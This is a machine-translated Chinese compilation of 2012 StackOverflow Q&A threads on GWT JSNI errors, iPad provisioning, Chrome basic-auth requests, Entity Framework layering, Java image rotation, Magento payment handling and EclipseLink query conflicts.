# StackOverflow 问答 10685000-10685999

# gwt - GWT 未捕获的 IllegalArgumentException

> ID：10685004
> 
> 赞同：0
> 
> 时间：2012-05-21T12:09:48.710
> 
> 标签：gwt

有时我的 GWT 应用程序会在下面报告“未捕获的 IllegalArgumentException”。错误日志有效地掩盖了应用程序的任何可能原因。在这种情况下，您将如何务实地确定问题的根源？

```
[ERROR] [mygwtapp] Uncaught exception escaped

java.lang.IllegalArgumentException: Something other than a Java object was returned from JSNI method '@com.google.gwt.core.client.impl.Impl::apply(Ljava/lang/Object;Ljava/lang/Object;Ljava/lang/Object;)': JS value of type boolean, expected java.lang.Object
    at com.google.gwt.dev.shell.JsValueGlue.get(JsValueGlue.java:178)
    at com.google.gwt.dev.shell.ModuleSpace.invokeNativeObject(ModuleSpace.java:271)
    at com.google.gwt.dev.shell.JavaScriptHost.invokeNativeObject(JavaScriptHost.java:91)
    at com.google.gwt.core.client.impl.Impl.apply(Impl.java)
    at com.google.gwt.core.client.impl.Impl.entry0(Impl.java:213)
    at sun.reflect.GeneratedMethodAccessor24.invoke(Unknown Source)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
    at java.lang.reflect.Method.invoke(Method.java:597)
    at com.google.gwt.dev.shell.MethodAdaptor.invoke(MethodAdaptor.java:103)
    at com.google.gwt.dev.shell.MethodDispatch.invoke(MethodDispatch.java:71)
    at com.google.gwt.dev.shell.OophmSessionHandler.invoke(OophmSessionHandler.java:172)
    at com.google.gwt.dev.shell.BrowserChannelServer.reactToMessages(BrowserChannelServer.java:292)
    at com.google.gwt.dev.shell.BrowserChannelServer.processConnection(BrowserChannelServer.java:546)
    at com.google.gwt.dev.shell.BrowserChannelServer.run(BrowserChannelServer.java:363)
    at java.lang.Thread.run(Thread.java:662) 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-21T12:18:55.490

如果您没有使用 Chrome，在这种情况下，这是一个[已知错误](http://code.google.com/p/google-web-toolkit/issues/detail?id=5778#c65)，唯一的解决方案是切换到 Firefox 或 IE 进行 DevMode 或等待[SuperDevMode](https://plus.google.com/110412141990454266397/posts/Nvr6Se6eAPh)（预计 GWT 2.5，将在一个月左右发布），然后你最好的选择是尝试在 prod 模式下重现它。

您还可以检查您的 JSNI 方法（因为它可能来自您自己的代码），是否有可能返回布尔值而不是对象（在这种特定情况下）。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-21T15:14:09.910

当您与调用的 JSNI 函数的返回值类型不匹配时，会发生此错误。

例如：

```
public class GWTTest implements EntryPoint 
{ 
    public void onModuleLoad() { 
        if(get()==false){ 
            System.out.println(get()); 
        } 
    } 
    private native Boolean get()/*-{ 
        return false; 
    }-*/; 
} 
```

在这里您将收到错误“java.lang.IllegalArgumentException：从 JSNI 方法返回的不是 Java 对象”

请记住：javascript 中没有自动装箱。

您应该返回布尔值，而不是布尔值。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-05-21T17:46:55.097

使用 JSNI，您必须[只返回](https://developers.google.com/web-toolkit/doc/latest/DevGuideCodingBasicsJSNI#passing-javascript)：

*   扩展 JavaScriptObject 的对象
*   Primitives & String （因为在*JS*中没有一个）
*   *来自 Java 代码的*Java 对象或数组

 *因此，如果原语不能满足您的需求，您可以返回**布尔值**或创建自己的[覆盖类型。](http://googlewebtoolkit.blogspot.com/2008/08/getting-to-really-know-gwt-part-2.html)但否则坚持使用原始布尔值。*

# iphone - 有什么方法可以检查 iPad 上的配置详细信息并与 Xcode 版本进行比较

> ID：10685008
> 
> 赞同：0
> 
> 时间：2012-05-21T12:09:58.630
> 
> 标签：iphone, xcode

我正在 ipad 上安装 ipa 文件，但它没有安装它给出的错误有没有办法检查 iPad 上的配置详细信息并与 Xcode 版本进行比较。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-21T18:49:57.897

您可以在 Xcode 运行时通过 USB 连接插入 iPad。在 Xcode 中，从 Window 菜单中选择 Organizer。在管理器中，单击“设备”每个设备以及您的主机 Mac 将显示其当前拥有的配置文件列表。

# java - GWT SimplePager：如何在第一个，最后一个，下一个，上一个等寻呼机按钮上提供工具提示？

> ID：10685012
> 
> 赞同：3
> 
> 时间：2012-05-21T12:10:18.287
> 
> 标签：java, gwt, tooltip, pager, simplepager

我通过扩展简单寻呼机来使用自定义寻呼机。GWT 版本是 2.3

我想在 SimplePagers 按钮上提供工具提示，例如第一个、最后一个、下一个、上一个。

我怎样才能做到这一点？

在此问题上的任何帮助或指导将不胜感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-22T16:50:28.243

这实际上并不是那么容易做到的，因为 SimplePager 不是一个非常可扩展的类。它不以任何方式提供对其私有按钮字段的访问，也不为每个字段分配唯一的样式类。

您可以使用的一种解决方案是：

```
final NodeList<Element> tdElems = 
    simplePager.getElement().getElementsByTagName("td");

for (int i = 0; i < tdElems.getLength(); i++) {

  final String toolTipText;

  if (i == 0)
    toolTipText = "First page";
  else if (i == 1)
    toolTipText = "Previous page";
  else if (i == 2)
    continue; /* This is the middle td - no button */
  else if (i == 3)
    toolTipText = "Next page";
  else if (i == 4)
    toolTipText = "Last page";
  else
    continue;

  tdElems.getItem(i).setTitle(toolTipText);
} 
```

但老实说，这不是一个非常可靠的方法 - 如果 SimplePager 的布局在未来发生变化，它就会中断。我宁愿重新实现 SimplePager，直接访问按钮字段。

# javascript - 在不使用 window.navigator.appVersion 的情况下检测 Chrome 的版本

> ID：10685013
> 
> 赞同：0
> 
> 时间：2012-05-21T12:10:29.560
> 
> 标签：javascript, google-chrome, google-chrome-extension, version

* * *

编辑：这个问题变得无关紧要，因为我发现 setRequestHeader 技术适用于 v18 和 v19。[http://code.google.com/p/chromium/issues/detail?id=123150#c39](http://code.google.com/p/chromium/issues/detail?id=123150#c39)上的海报似乎不正确，说这种方法在 v18 上不起作用 - 它确实如此。如果允许，我将在 8 小时内更新此答案！

* * *

我正在使用 Chrome 扩展程序，它是一种自动测试工具。它已覆盖用户代理（在启动 chrome 时通过命令行），因此我无法再使用 appVersion 查看 chrome 的版本。

还有其他方法可以检测 Javascript 中的 chrome 版本吗？

背景：我正在使用 xmlhttp 请求受基本身份验证保护的页面。

我现在必须根据 v18 或 v19+ 采取不同的操作，因为谷歌在 v19 的 URL 中删除了嵌入的基本身份验证（请参阅[http://code.google.com/p/chromium/issues/detail?id=123150#c39](http://code.google.com/p/chromium/issues/detail?id=123150#c39)）。

这是一个自动脚本，所以我不会在那里输入用户名或密码，但脚本都知道它们。

```
if (v18_or_earlier)
{
    xmlhttp.open("POST", url, true, http_basic_username, http_basic_password) ;
}
else //v19+
{
    xmlhttp.open("POST", get_upload_url(), true);
    var auth_header = "Basic " + Base64.encode(http_basic_username + ":" + http_basic_password) ;
    xmlhttp.setRequestHeader("Authorization", auth_header) ;
}
xmlhttp.send(post_body) ; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-21T12:47:17.493

像这样的东西会起作用吗？

```
<script>  
function chrome_version( version ) {  
  if ( version < 18) {  
    xmlhttp.open("POST", get_upload_url(), true);  
    var auth_header = "Basic " + Base64.encode(http_basic_username + ":" +   http_basic_password) ;  
    xmlhttp.setRequestHeader("Authorization", auth_header) ;  
  } else {  
  # Maybe do framebusting or...  
  xmlhttp.open("POST", url, true, http_basic_username, http_basic_password) ;  
  }     
}  
</script>  
<iframe src="http://user:pass@example.org"  
        onload="chrome_version(18)"  
        onerror="chrome_version(19)">  
</iframe> 
```

# entity-framework - 服务层、存储库层和实体框架

> ID：10685014
> 
> 赞同：0
> 
> 时间：2012-05-21T12:10:30.457
> 
> 标签：entity-framework, architecture, repository-pattern, separation-of-concerns, n-layer

我正在使用实体框架（POCO 实体）设计分层架构（所有层都在同一台机器上），以便将相同的层与 ASP.Net MVC 应用程序、移动应用程序等一起使用；也为了保持可测试性......

我将拥有 UI 层 > 服务层 > 存储库层 > 实体框架 > 数据库，具有依赖注入、层抽象和关注点分离。

*   假设，我有两个方法（客户，订单是实体类）。我应该在哪一层放置这些方法？：

    *   包含 LINQ 查询的公共 IList GetOrdersByCustomerId(int CustomerId)。
        *（存储层，还是服务层？）*
    *   public void RequestAnOrderAndStartTheShipmentProcess(Customer CustomerEntity, Order OrderEntity) 执行一些插入操作，如 orderRepository.Add(OrderEntity)、shipmentRepository.Add(ShipmentEntity) 等...
        *（单独的业务逻辑层或服务层？）*
*   我将有 IOrderService 接口，以及用于依赖注入的“OrderService : IOrderService”类，接口和类将定位在同一个程序集中，还是应该定位在不同的程序集中？

谢谢

## 编辑

感谢您的回答。但是在这种情况下，想到了四个问题...
1.如果UI有引用DataAccess程序集，开发人员可以直接在UI代码中访问DataAccess类，难道不应该增加额外的代码审查工作吗？ （例如，如果团队中有初级开发人员）？
2.我明白了，我应该在Repository层（做真正的查询）和Service层（在OrderRepository类中调用GetOrdersByCustomerId方法）都有GetOrdersByCustomerId方法，对吗？
3\. 另外我应该对（几乎）所有表进行 CRUD 操作以维护它们，并考​​虑我当前项目中有 96 个表（不是太多但也不少），我应该有添加、更新、删除方法也在服务层？还是我应该在我的服务层考虑更多的“行为”？
4\. 我很困惑，如果我的 OrderRepository 中有 GetOrdersByCustomerById、GetOrdersByStatus 等方法，那不就是一个 DAO 类吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-22T18:50:24.350

您可以考虑具有三个组件（层）的架构：

**包含您的服务类的业务**
（以及您的 RequestAnOrderAndStartTheShipmentProcess 方法）。业务层将包含您所有的核心业务规则，因此您不太可能突然想用一个全新的层交换这个层或添加一个替代方案。因此，我会在此程序集中同时保留 OrderService 和 IOrderService。我还将 POCO 类（让 EF 像[这样](http://blogs.msdn.com/b/adonet/archive/2010/01/25/walkthrough-poco-template-for-the-entity-framework.aspx)为你自动生成这些）和存储库接口放在这一层中。

**DataAccess**
这是您保存 EF 存储库实现（以及您的 GetOrdersByCustomerId 方法）的地方。该程序集引用了业务程序集，因为它实现了在该层中找到的存储库接口。

**UI**
在这里，您从 DataAccess 程序集中实例化存储库，并使用构造函数注入将它们注入到业务层的服务类中。因此，该程序集具有对 Business 和 DataAccess 的引用。

使用这种架构，您的业务层与其他层很好地分离，并且易于单元测试。有关依赖注入的更多详细信息，请参阅[此](https://stackoverflow.com/a/2047657/1369673)答案。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-21T18:21:25.613

我的意见（总是有点武断）：

1.  存储库，因为它是对单个实体集的典型指定获取操作。
2.  服务层，因为它在多个实体上编排了多个操作。
3.  分离程序集，因此您可以从其他程序集中添加接口实现，而无需引用已包含实现的程序集。

# java - 在java中旋转图像

> ID：10685016
> 
> 赞同：6
> 
> 时间：2012-05-21T12:10:32.790
> 
> 标签：java, graphics

我有一张 Pan Card 的图像，当我尝试将它旋转 45 度并保存它时，我得到一个裁剪的图像。旋转图像的代码是：

```
 BufferedImage dimg = new BufferedImage(w, h, img.getType());
    Graphics2D g = dimg.createGraphics();
    g.setRenderingHint(RenderingHints.KEY_ANTIALIASING, // Anti-alias!
            RenderingHints.VALUE_ANTIALIAS_ON);

    g.rotate(Math.toRadians(angle), w / 2, h / 2);

    g.drawImage(img, null, 0, 0); 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-05-21T12:19:11.193

看看这个例子，使用 AffineTransform：

[http://www.billthelizard.com/2008/07/rotate-image-in-java.html](http://www.billthelizard.com/2008/07/rotate-image-in-java.html)

有一些代码来加载图像，那么这是核心：

```
private Image image;
AffineTransform identity = new AffineTransform();

Graphics2D g2d = (Graphics2D)g;
AffineTransform trans = new AffineTransform();
trans.setTransform(identity);
trans.rotate( Math.toRadians(45) );
g2d.drawImage(image, trans, this); 
```

# php - Magento - 如何停止对失败的付款交易开具发票

> ID：10685021
> 
> 赞同：0
> 
> 时间：2012-05-21T12:10:45.607
> 
> 标签：php, zend-framework, magento

我正在使用自定义支付模块，并且在收到来自自定义支付网关的失败交易响应后，我想

*   使用“pending_payment”状态/状态保存订单，不要发送任何订单电子邮件。

*   我不想创建任何发票/处理它或发送任何发票电子邮件。

*   此外，我想将我的客户重定向到失败页面或结帐/购物车页面，但顶部有一条消息说他们的付款详细信息有误，请重试。

一旦我收到来自我的支付网关的“失败”响应，我就可以将订单保存到 pending_payment 状态并停止它发送新的订单电子邮件，但我无法阻止它开票 n 因此停止 d 发票电子邮件送出。

我在我的自定义支付模块中调用事件观察员，`sales_order_place_after`该模块为订单开具发票并在成功交易时发送发票电子邮件。

现在我不知道该文件是否也需要编辑（app/code/local/Mage/Paymentmodule/Model/Observer.php）或者只是我的 app/code/local/Mage/Paymentmodule/Model/PaymentMethod.php 就足够了。

PaymentMethod.php

```
 public function capture(Varien_Object $payment, $amount) 
      {
        $error = false;
    // check for payment
   if($amount > 0)
   {
    $payment->setAmount($amount);
    $order = $payment->getOrder();
    if($payment->getTxnNumber() == "")
    {
        $transaction = $this->_build($payment, self::TRANSACTION_PREAUTH);
            $authResponse = $this->_send($transaction);
        if($authResponse->getResponseCode() > 0 && $authResponse->getResponseCode() <= self::ERROR_CODE_LIMIT)
        {
            $payment->setCcApproval($authResponse->getReceiptId())
             ->setLastTransId($authResponse->getReceiptId())
             ->setCcTransId($authResponse->getTxnNumber())    ->setCcCidStatus($this->getCvdDescription($authResponse->getCvdResultCode()));    

        }
        else if($authResponse->getResponseCode() > self::ERROR_CODE_LIMIT && $authResponse->getResponseCode() < self::ERROR_CODE_UPPER_LIMIT)
        {
           $order->setState(Mage_Sales_Model_Order::STATE_PENDING_PAYMENT, 'pending_payment', '', false)->save();
           $order->setCanSendNewEmailFlag(false);
           $order->setCanInvoiceFlag(false);
        }
        else
        {
           $order->setState(Mage_Sales_Model_Order::STATE_PENDING_PAYMENT, 'pending_payment', '', false)->save();
           $order->setCanSendNewEmailFlag(false);
           $order->setCanInvoiceFlag(false);
        }
    }
    $check = $this->checkCvdResponse($authResponse->getCvdResultCode());
    if($check == true)
    {
        $order->setState(Mage_Sales_Model_Order::STATE_PENDING_PAYMENT, 'pending_payment', '', false)->save();
        $order->setCanSendNewEmailFlag(false);
        $order->setCanInvoiceFlag(false);
    }
    else
    {
        $transaction_completion = $this->_build($payment, self::TRANSACTION_COMPLETION);
        $response = $this->_send($transaction_completion);  
        if($response->getResponseCode() > 0 && $response->getResponseCode() <= self::ERROR_CODE_LIMIT) 
        {
            $payment->setStatus(self::STATUS_SUCCESS);
            $payment->setCcApproval($response->getReceiptId())
             ->setLastTransId($response->getReferenceNum())
             ->setCcTransId($response->getTxnNumber())
             ->setCcAvsStatus($this->getAvsDescription($authResponse->getAvsResultCode()))
             ->setCcCidStatus($this->getCvdDescription($authResponse->getCvdResultCode())); 
        }    
        else if($response->getResponseCode() > self::ERROR_CODE_LIMIT && $response->getResponseCode() < self::ERROR_CODE_UPPER_LIMIT) 
        {
            $order->setState(Mage_Sales_Model_Order::STATE_PENDING_PAYMENT, 'pending_payment', '', false)->save();
            $order->setCanSendNewEmailFlag(false);
            $order->setCanInvoiceFlag(false);
        } 
        else 
        {
           $order->setState(Mage_Sales_Model_Order::STATE_PENDING_PAYMENT, 'pending_payment', '', false)                                       ->save();
           $order->setCanSendNewEmailFlag(false);
           $order->setCanInvoiceFlag(false);
        }
    }
} 
else
{
    $error = Mage::helper('paygate')->__('Invalid amount for authorization.');
}
if ($error !== false)
Mage::throwException($error);
    return $this;
 } 
```

观察者.php

```
 public function implementOrderStatus($event)
  {
    $order = $event->getEvent()->getOrder();    
    if ($this->_getPaymentMethod($order) == 'custompaymentmodule') 
    {
        if($order->getState() == 'pending_payment')
        {
          $order->setCanSendNewEmailFlag(false);
          $order->setCanInvoiceFlag(false);
        }
                 if ($order->canInvoice())

            $this->_processOrderStatus($order);
    }
    return $this;
} 
```

任何想法我如何才能保存它pending_payment 状态并停止它形成发票并使用适当的消息重定向到购物车页面。

任何有关解决任何问题的帮助将不胜感激。谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-22T12:16:20.480

我找到了解决问题的部分方法。在失败的付款交易中，`pending_payment`我没有在我的 PaymentMethod.php 中设置状态，而是将付款状态设置为已拒绝并设置`CcTransId`为 NULL

然后在我的 Observer.php 中使用此条件，我将使用`pending_payment`状态保存该订单。

这是修改后的代码

PaymentMethod.php

```
 if($payment->getTxnNumber() == "")
   {
      <!-- SOME CODE -->
      if($authResponse->getResponseCode() > 0 && $authResponse->getResponseCode() <= self::ERROR_CODE_LIMIT)
      {
        <!-- SUCCESSFUL TRANSACTION CODE   
      }
      else if($authResponse->getResponseCode() > self::ERROR_CODE_LIMIT && $authResponse->getResponseCode() < self::ERROR_CODE_UPPER_LIMIT)
      {
         $payment->setStatus(self::STATUS_DECLINED);
      }
      else
      {
         $payment->setStatus(self::STATUS_DECLINED);
      }
   }
   $check = $this->checkCvdResponse($authResponse->getCvdResultCode());
   if($check == true)
   {
       $payment->setStatus(self::STATUS_DECLINED);
       $payment->setCcTransId(NULL);  
   }
   else
   {
       $transaction_completion = $this->_build($payment, self::TRANSACTION_COMPLETION);
       $response = $this->_send($transaction_completion);  
       if($response->getResponseCode() > 0 && $response->getResponseCode() <= self::ERROR_CODE_LIMIT) 
       {
          <!-- SUCCESSFUL CAPTURE -->   
       }    
      else if($response->getResponseCode() > self::ERROR_CODE_LIMIT && $response->getResponseCode() < self::ERROR_CODE_UPPER_LIMIT) 
      {
         $payment->setStatus(self::STATUS_DECLINED);
         $payment->setCcTransId(NULL);  
      } 
      else 
      {
        $payment->setStatus(self::STATUS_DECLINED);
        $payment->setCcTransId(NULL);  
      }
} 
```

观察者.php

```
 public function implementOrderStatus($event)
    {
      $order = $event->getEvent()->getOrder(); 
      if ($this->_getPaymentMethod($order) == 'custompaymentmodule') 
      {
     if($order->getPayment()->getCcTransId() == NULL)
     {
        $state = 'pending_payment';
    $status = 'pending_payment';
    $comment = 'Payment transaction failed due to incorrect AVS/CVD details.';
    $isNotified = false;
    $order->setState($state,$status,$comment,$isNotified)->save();
        $order->setCanSendNewEmailFlag(false);
         }
         else
         {
             <!-- SUCCESSFUL INVOICE CODE -->
         }
      } 
```

我现在唯一剩下的就是将用户重定向到购物车页面，并在顶部显示错误消息。

但是，由于我需要在 Observer 文件中执行所有这些操作，因此我无法调用`$this->_redirect()`方法。尝试过`Mage::app->getResponse->setRedirect(Mage::getUrl('checkout/cart'))`但效果不佳。

关于如何完成这最后一点的任何想法。}

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-12-11T15:43:26.183

一旦付款失败，我正在使用它成功重定向到购物车页面。

```
Mage::app()->getFrontController()->getResponse()->setRedirect(Mage::getUrl('checkout/onepage/index/'))->sendResponse(); 
```

# jakarta-ee - org.eclipse.persistence.exceptions.ValidationException：无法添加类型与现有查询冲突的查询

> ID：10685023
> 
> 赞同：1
> 
> 时间：2012-05-21T12:10:52.150
> 
> 标签：jakarta-ee, ejb, eclipselink

我有一个关于股票交易的 Java EE 应用程序，它使用 Web 服务调用 EJB。一切正常，直到我在数据库中添加了一个额外的字段。该应用程序给出以下例外：

```
WARNING: A system exception occurred during an invocation on EJB StockCommodityEJB method public java.util.Collection ejb.StockCommodityEJB.getAllScrips()
javax.ejb.TransactionRolledbackLocalException: Exception thrown from bean
    at com.sun.ejb.containers.BaseContainer.checkExceptionClientTx(BaseContainer.java:5049)

    at $Proxy640.getAllScrips(Unknown Source)

    at service.StatelessWebService.getAllScrips(StatelessWebService.java:62)
    ....
    ...
com.sun.xml.ws.api.pipe.helper.AbstractTubeImpl.process(AbstractTubeImpl.java:116)
    at com.sun.enterprise.security.webservices.CommonServerSecurityPipe.processRequest(CommonServerSecurityPipe.java:212)
    ...

Caused by: Exception [EclipseLink-7092] (Eclipse Persistence Services - 2.3.0.v20110604-r9504): org.eclipse.persistence.exceptions.ValidationException
Exception Description: Cannot add a query whose types conflict with an existing query. Query To Be Added: [ReadAllQuery(name="UserStock.findAll" referenceClass=UserStock jpql="SELECT u FROM UserStock u")] is named: [UserStock.findAll] with arguments [[]].The existing conflicting query: [ReadAllQuery(name="UserStock.findAll" referenceClass=UserStock jpql="SELECT u FROM UserStock u")] is named: [UserStock.findAll] with arguments: [[]].
    at org.eclipse.persistence.exceptions.ValidationException.existingQueryTypeConflict(ValidationException.java:902)
    at org.eclipse.persistence.internal.sessions.AbstractSession.addQuery(AbstractSession.java:422)
    at org.eclipse.persistence.internal.sessions.AbstractSession.addQuery(AbstractSession.java:395)
    at org.eclipse.persistence.internal.sessions.AbstractSession.processJPAQueries(AbstractSession.java:2148)
    at org.eclipse.persistence.internal.sessions.DatabaseSessionImpl.initializeDescriptors(DatabaseSessionImpl.java:442)
    at org.eclipse.persistence.internal.sessions.DatabaseSessionImpl.postConnectDatasource(DatabaseSessionImpl.java:673)
    at org.eclipse.persistence.internal.sessions.DatabaseSessionImpl.login(DatabaseSessionImpl.java:631)
    at org.eclipse.persistence.internal.jpa.EntityManagerFactoryDelegate.createEntityManagerImpl(EntityManagerFactoryDelegate.java:284)
    ...
com.sun.enterprise.container.common.impl.EntityManagerWrapper.createNamedQuery(EntityManagerWrapper.java:532)
    at ejb.StockCommodityEJB.getAllScrips(StockCommodityEJB.java:351)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
    ...

SEVERE: The log message is null.
javax.ejb.EJBTransactionRolledbackException
    at ejb._StockCommodityEJBStateless_Wrapper.getAllScrips(ejb/_StockCommodityEJBStateless_Wrapper.java)
    at service.StatelessWebService.getAllScrips(StatelessWebService.java:62)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
    ...

Caused by: javax.transaction.TransactionRolledbackException: CORBA TRANSACTION_ROLLEDBACK 9998 Maybe; nested exception is: 
    org.omg.CORBA.TRANSACTION_ROLLEDBACK:   vmcid: 0x2000  minor code: 1806 completed: Maybe
    at com.sun.corba.ee.impl.javax.rmi.CORBA.Util.mapSystemException(Util.java:277)
    at com.sun.corba.ee.impl.javax.rmi.CORBA.Util.wrapException(Util.java:696)
    at com.sun.corba.ee.impl.presentation.rmi.StubInvocationHandlerImpl.privateInvoke(StubInvocationHandlerImpl.java:251)
    ...

Caused by: Exception [EclipseLink-7092] (Eclipse Persistence Services - 2.3.0.v20110604-r9504): org.eclipse.persistence.exceptions.ValidationException
Exception Description: Cannot add a query whose types conflict with an existing query. Query To Be Added: [ReadAllQuery(name="UserStock.findAll" referenceClass=UserStock jpql="SELECT u FROM UserStock u")] is named: [UserStock.findAll] with arguments [[]].The existing conflicting query: [ReadAllQuery(name="UserStock.findAll" referenceClass=UserStock jpql="SELECT u FROM UserStock u")] is named: [UserStock.findAll] with arguments: [[]].
    at org.eclipse.persistence.exceptions.ValidationException.existingQueryTypeConflict(ValidationException.java:902)
    at org.eclipse.persistence.internal.sessions.AbstractSession.addQuery(AbstractSession.java:422)
    at org.eclipse.persistence.internal.sessions.AbstractSession.addQuery(AbstractSession.java:395)
    ...

WARNING: A system exception occurred during an invocation on EJB StatelessWebService method public java.util.Collection service.StatelessWebService.getAllScrips()
javax.ejb.EJBTransactionRolledbackException
    at ejb._StockCommodityEJBStateless_Wrapper.getAllScrips(ejb/_StockCommodityEJBStateless_Wrapper.java)
    at service.StatelessWebService.getAllScrips(StatelessWebService.java:62)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
    at java.lang.reflect.Method.invoke(Method.java:597)
    at org.glassfish.ejb.security.application.EJBSecurityManager.runMethod(EJBSecurityManager.java:1052)
    at org.glassfish.ejb.security.application.EJBSecurityManager.invoke(EJBSecurityManager.java:1124)
    at com.sun.ejb.containers.BaseContainer.invokeBeanMethod(BaseContainer.java:5366)
    at com.sun.ejb.EjbInvocation.invokeBeanMethod(EjbInvocation.java:619)
    ...
    at $Proxy641.getAllScrips(Unknown Source)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)

Caused by: Exception [EclipseLink-7092] (Eclipse Persistence Services - 2.3.0.v20110604-r9504): org.eclipse.persistence.exceptions.ValidationException
Exception Description: Cannot add a query whose types conflict with an existing query. Query To Be Added: [ReadAllQuery(name="UserStock.findAll" referenceClass=UserStock jpql="SELECT u FROM UserStock u")] is named: [UserStock.findAll] with arguments [[]].The existing conflicting query: [ReadAllQuery(name="UserStock.findAll" referenceClass=UserStock jpql="SELECT u FROM UserStock u")] is named: [UserStock.findAll] with arguments: [[]].
    at org.eclipse.persistence.exceptions.ValidationException.existingQueryTypeConflict(ValidationException.java:902)

    at org.eclipse.persistence.internal.sessions.DatabaseSessionImpl.login(DatabaseSessionImpl.java:631)
    at org.eclipse.persistence.internal.jpa.EntityManagerFactoryDelegate.createEntityManagerImpl(EntityManagerFactoryDelegate.java:284)
    at org.eclipse.persistence.internal.jpa.EntityManagerFactoryImpl.createEntityManagerImpl(EntityManagerFactoryImpl.java:290)
    at org.eclipse.persistence.internal.jpa.EntityManagerFactoryImpl.createEntityManager(EntityManagerFactoryImpl.java:275)
    ...

SEVERE: Error Rendering View[/AdminTemplate/scripMaster.xhtml]
javax.el.ELException: /AdminTemplate/scripMaster.xhtml @50,61 value="#{manageScrip.scripList}": javax.xml.ws.soap.SOAPFaultException: javax.ejb.EJBTransactionRolledbackException
    at com.sun.faces.facelets.el.TagValueExpression.getValue(TagValueExpression.java:114)
    at javax.faces.component.ComponentStateHelper.eval(ComponentStateHelper.java:194)
    at javax.faces.component.ComponentStateHelper.eval(ComponentStateHelper.java:182)
    at javax.faces.component.UIData.getValue(UIData.java:731)
    at org.primefaces.component.datatable.DataTable.getValue(DataTable.java:786)
    at javax.faces.component.UIData.getDataModel(UIData.java:1798)
    at javax.faces.component.UIData.getRowCount(UIData.java:356)
    at org.primefaces.component.api.UIData.calculatePage(UIData.java:116)

    ...
    at $Proxy643.getAllScrips(Unknown Source)
    at beans.manageScrip.getAllScrips(manageScrip.java:422)
    at beans.manageScrip.getScripList(manageScrip.java:180)
    sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
    at java.lang.reflect.Method.invoke(Method.java:597)
    at javax.el.BeanELResolver.getValue(BeanELResolver.java:302)
    at com.sun.faces.el.DemuxCompositeELResolver._getValue(DemuxCompositeELResolver.java:176)
    at com.sun.faces.el.DemuxCompositeELResolver.getValue(DemuxCompositeELResolver.java:203)
    at com.sun.el.parser.AstValue.getValue(AstValue.java:116)
    at com.sun.el.parser.AstValue.getValue(AstValue.java:163)
    at com.sun.el.ValueExpressionImpl.getValue(ValueExpressionImpl.java:219)
    at org.jboss.weld.el.WeldValueExpression.getValue(WeldValueExpression.java:55)
    at com.sun.faces.facelets.el.TagValueExpression.getValue(TagValueExpression.java:109)
    ... 48 more

WARNING: StandardWrapperValve[Faces Servlet]: PWC1406: Servlet.service() for servlet Faces Servlet threw exception
javax.xml.ws.soap.SOAPFaultException: javax.ejb.EJBTransactionRolledbackException
    at com.sun.xml.ws.fault.SOAP11Fault.getProtocolException(SOAP11Fault.java:193)
    ... 
```

我调试发现ejb的getAllScrips方法抛出了异常下面是托管bean方法和web服务方法：

```
private java.util.List<service.ScripMaster> getAllScrips() {
    service.StatelessWebService port = service.getStatelessWebServicePort();
    return port.getAllScrips();
}

public List<ScripMaster> getScripList() {
    scripList=new ArrayList<ScripMaster> ();
 scripList=getAllScrips();
    return scripList;
} 
```

以下是 EJB 方法：

```
@Override
public Collection<ScripMaster> getAllScrips() {
    Collection<ScripMaster> scripCollection=null;
    scripCollection=em.createNamedQuery("ScripMaster.findAll").getResultList();
    return scripCollection;
} 
```

`scrip.findall`询问 ：

```
@NamedQuery(name = "ScripMaster.findAll", query = "SELECT s FROM ScripMaster s") 
```

**编辑：** 在实体类 ScripMaster.java 我添加了以下代码：

```
 @Column(name = "PreviousClose", precision = 22)
    private Double previousClose; //new column
    @Column(name = "Change", precision = 22)
    private Double change; //new column 
```

他们的吸气剂二传手将其记录下来。

这是如何引起的，我该如何解决？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-22T16:14:06.603

实际问题在此问题开始发生之前就已记录在案，并且可能与您正在执行的查询无关 - 只是碰巧这是您的应用程序中的第一个 EM 访问，并且容器将 EM 包装在代理后面。

EclipseLink 有错误[https://bugs.eclipse.org/bugs/show_bug.cgi?id=376995](https://bugs.eclipse.org/bugs/show_bug.cgi?id=376995)已在 2.4 中修复，这将导致在部署阶段处于失败状态时发生此错误。在失败后尝试使用工厂将导致它尝试重新添加 JPQL 查询，从而导致此错误。该补丁会保留初始错误并重新抛出它，从而更容易找到初始原因。因此，您可以尝试使用 EclipseLink 2.4 nightly build，但实际原因应该出现在 EMF 部署期间的日志中。

您在应用程序中添加了哪些代码来支持新领域？

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-13T08:44:09.580

我为查询使用了不同的名称来解决它。以“find”开头的命名查询名称似乎确实会引起麻烦。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-22T04:53:30.860

目前，您使用哪个 Eclipse 版本？这是一个问题`EclipseLink 2.1.2`。

